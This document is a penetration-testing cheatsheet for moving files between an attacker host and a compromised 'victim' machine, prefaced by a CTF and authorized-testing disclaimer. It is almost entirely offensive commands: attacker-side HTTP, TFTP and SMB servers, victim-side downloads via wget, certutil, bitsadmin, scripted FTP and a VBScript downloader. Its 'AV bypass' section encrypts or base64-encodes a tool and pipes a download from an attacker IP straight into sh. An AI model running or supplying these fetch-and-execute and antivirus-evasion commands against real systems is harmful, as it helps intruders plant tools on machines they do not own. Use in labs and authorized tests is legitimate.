File transfer cheatsheet
=======

__Attention: The articles published on this wiki are for education purpose, to use during a CTF or for an authorized penetrationtest. By using the wiki, you've agreed to use this knowledge in an ethical way and do not evil in any perspective.__

Attacker
---------
The following options should be started on the host where the file is located.

## HTTP

__Python__
```bash
sudo python -m SimpleHTTPServer 80 
```

__Python 3__
```bash
sudo python3 -m http.server 80 
```

__Apache__
```bash
service apache2 start
# /var/www/html # DIRECTORY HOSTING FILES
```

__PHP__
```bash
 php -S 127.0.0.1:8080
 ```

__Ruby__
```bash
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 8080, :DocumentRoot => Dir.pwd).start"
```

## TFTP
```bash
mkdir /tftp # DIRECTORY HOSTING FILES
atftpd --daemon --port 69 /tftp
```

## FTP


## SMB
__Impacket__
```bash
sudo impacket-smbserver <sharename> <share path>
```

Victim
---------
From the client the following options could be used to retrieve or send a file

## Linux

__HTTP Download__

```bash
wget http://IP-attacker/filename.sh
```

__AV bypass__
```bash
#open-ssl encryption
openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc #Protect the file with a password and it the output file is lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh #Download from the victim and open the file with the password and pipe it to sh
```
```bash
#Base64 encoded
base64 -w0 linpeas.sh > lp.enc #encode the file to a new file
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim decode the file with base 64 and pipe it to sh
```

## Windows


__HTTP Download__
```bash
certutil -urlcache -f http://IP-attacker/filename.exe shell.exe
```

```bash
bitsadmin /transfer n http://IP-attacker/file c:%homepath%file
```

__FTP Download/Upload__
```bash
echo "open <IP> ">ftp.txt
echo "user">>ftp.txt
echo "pass">>ftp.txt
echo "bin">>ftp.txt
echo "get file.exe">>ftp.txt
echo "put file.exe">>ftp.txt
echo "bye">>ftp.txt

ftp -s ftp.txt
```

__TFTP Download/Upload__

```bash
tftp -i [kali ip] get [file]
```


__SMB Download/Upload__



__VBScript via HTTP__
This works for Windows XP, 2003 (if still used during a CTF).
Moderate speed of 50kb/sec. 

```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
cscript wget.vbs http://[kali ip]/[file] [file]
```